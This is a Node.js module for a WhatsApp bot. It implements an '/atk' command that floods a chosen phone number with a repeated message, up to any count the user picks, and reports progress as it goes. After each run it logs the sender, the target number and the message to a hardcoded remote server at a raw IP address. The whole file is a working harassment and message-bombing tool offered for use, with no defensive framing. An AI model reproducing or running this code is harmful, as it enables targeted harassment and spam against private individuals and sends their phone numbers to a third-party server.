const axios = require('axios');

const API_URL = process.env.API_URL || 'http://201.23.69.230:3000';

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function executar(msg, client, estado) {
    const partes = msg.body.trim().split(/\s+/);

    if (partes.length < 3) {
        msg.reply('Formato: /atk NUMERO QTD MENSAGEM\nExemplo: /atk 5511988887777 5 Ola');
        return;
    }

    const numero = partes[1];
    const quantidade = parseInt(partes[2], 10);
    const mensagem = partes.slice(3).join(' ');

    if (isNaN(quantidade) || quantidade < 1) {
        msg.reply('Quantidade invalida. Use um numero maior que 0.');
        return;
    }

    if (!mensagem) {
        msg.reply('Mensagem nao pode estar vazia.');
        return;
    }

    const digitos = numero.replace(/\D/g, '');
    if (digitos.length < 12 || digitos.length > 13) {
        msg.reply('Numero invalido. Use o formato: 5511999999999 (DDI+DDD+numero, 12-13 digitos)');
        return;
    }

    let alvo;
    try {
        alvo = await client.getNumberId(digitos);
    } catch (e) {
        console.error('Erro getNumberId:', e);
        msg.reply('Erro ao verificar numero no WhatsApp.');
        return;
    }

    if (!alvo) {
        msg.reply(`O numero ${digitos} nao possui WhatsApp.`);
        return;
    }

    const chatId = alvo._serialized || alvo.toString();

    estado.ativo = true;
    estado.usuario = msg.from;
    estado.alvo = chatId;
    estado.enviadas = 0;
    estado.total = quantidade;

    msg.reply(`Iniciando ataque a ${digitos} (${quantidade} disparos)...`);

    await delay(1000);

    try {
        for (let i = 1; i <= quantidade && estado.ativo; i++) {
            await client.sendMessage(chatId, mensagem);
            estado.enviadas = i;

            if (i % 5 === 0) {
                msg.reply(`${i}/${quantidade} mensagens enviadas...`);
            }

            if (i < quantidade && estado.ativo) {
                await delay(500);
            }
        }

        if (estado.ativo) {
            msg.reply(`Ataque concluido! ${quantidade}/${quantidade} mensagens enviadas para ${digitos}.`);
        }

        estado.ativo = false;

        try {
            await axios.post(`${API_URL}/ataques`, {
                comando: '/atk',
                autor: msg.from,
                alvo: chatId,
                quantidade: estado.enviadas,
                mensagem,
                status: estado.enviadas === quantidade ? 'concluido' : 'interrompido'
            });
        } catch (error) {
            console.error('Erro ao registrar ataque na API:', error.message);
        }

    } catch (error) {
        estado.ativo = false;
        console.error('Erro completo no ataque:', error);
        msg.reply(`Erro durante o ataque: ${error.message || error}`);
    }
}

module.exports = { executar };
